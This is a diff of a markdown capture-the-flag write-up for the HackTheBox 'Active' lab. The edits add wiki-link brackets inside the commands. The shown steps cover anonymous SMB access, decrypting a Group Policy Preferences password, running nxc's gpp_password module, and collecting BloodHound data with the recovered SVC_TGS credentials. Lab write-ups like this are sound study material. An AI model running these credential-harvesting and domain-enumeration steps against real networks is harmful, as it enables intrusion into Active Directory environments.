@@ -79,7 +79,7 @@ smbclient //10.10.10.100/Replication -U ""%""
 	```
 	- gpp-decrypt decrypt's password to GPPstillStandingStrong2k18
 - using the username password combination SVC_TGS / GPPstillStandingStrong2k18 
-	- `nxc smb 10.10.10.100 -u '' -p '' -M gpp_password -o`
+	- `nxc [[smb]] 10.10.10.100 -u '' -p '' -M gpp_password -o`
 	```bash
 	[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
         Disk                                                    Permissions     Comment
@@ -115,7 +115,7 @@ smb: \> ls
 
 - now that we have Domain creds we run bloodhound
 	- specifcally nxc to ingest bloodhound data
-	- `nxc ldap 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -k --dns-server 10.10.10.100 --bloodhound --collection All`
+	- `nxc [[ldap]] 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -k --[[dns]]-server 10.10.10.100 --[[bloodhound]] --collection All`
 
 - Then we queried bloodhound data for 
 	- Shortest path to domain admin
